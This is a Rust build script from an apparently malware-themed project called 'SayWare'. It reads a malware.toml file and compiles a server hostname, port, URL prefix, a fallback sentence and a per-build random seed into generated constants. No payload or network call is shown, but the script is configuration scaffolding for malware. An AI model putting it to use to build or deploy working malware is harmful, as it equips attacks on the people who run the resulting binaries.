// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

use anyhow::Result;
use quote2::{Quote, proc_macro2::TokenStream, quote};
use rand::{RngCore, rng};
use serde::Deserialize;
use std::{
    env::var,
    fs::{read_to_string, write},
    path::Path,
};
use toml::from_str;

#[derive(Deserialize)]
struct Configuration {
    server: Server,
    malware: Malware,
}

#[derive(Deserialize)]
struct Server {
    hostname: String,
    port: u16,
    url_prefix: String,
}

#[derive(Deserialize)]
struct Malware {
    fallback_sentence: String,
}

fn main() -> Result<()> {
    println!("cargo::rerun-if-changed=NULL");

    let seed = rng().next_u64();

    let data = read_to_string("../malware.toml")?;
    let configuration = &from_str::<Configuration>(&data)?;
    let server_hostname = &configuration.server.hostname;
    let server_port = configuration.server.port;
    let server_url_prefix = &configuration.server.url_prefix;
    let fallback_sentence = &configuration.malware.fallback_sentence;

    let mut tokens = TokenStream::new();
    quote!(tokens, {
        use std::hint::black_box;

        static SEED: u64 = black_box(#seed);

        const SERVER_HOSTNAME: &str = #server_hostname;
        const SERVER_PORT: u16 = #server_port;
        const SERVER_URL_PREFIX: &str = #server_url_prefix;

        const FALLBACK_SENTENCE: &str = #fallback_sentence;
    });

    write(
        Path::new(&var("OUT_DIR")?).join("configuration.rs"),
        tokens.to_string(),
    )?;

    Ok(())
}
